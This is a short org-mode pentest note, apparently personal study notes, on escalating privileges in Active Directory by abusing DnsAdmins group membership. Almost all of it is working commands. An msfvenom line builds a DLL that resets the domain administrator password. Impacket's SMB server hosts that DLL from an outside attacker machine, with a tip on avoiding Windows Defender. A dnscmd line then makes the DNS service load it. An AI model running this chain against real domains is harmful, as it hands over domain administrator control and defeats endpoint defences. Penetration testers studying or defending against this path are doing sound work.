:PROPERTIES:
:ID:       d7eaf0d7-084c-46a8-a42c-d9abbb3f748f
:END:
#+title: Pentest - Active Directory - DNS
#+hugo_base_dir:../


* DNS
** DNSAdmins
Being a member of the DnsAdmins group allows us to use the =dnscmd.exe= to specify a plugin DLL that should be loaded by the DNS service. Let's create a DLL using msfvenom that changes the administrator password.

#+begin_src shell -n :exports both :results output verbatim :tangle file
msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > da.dll
#+end_src

Transferring this to the box would likely trigger Windows Defender, so we can use Impacket's =smbserver.py= to start an SMB server and host the dll remotely.

#+begin_src shell -n
sudo impacket-smbserver share ./
#+end_src


Then set the remote DLL path in the Windows registry

#+begin_src shell -n
cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.9\share\da.dll
#+end_src
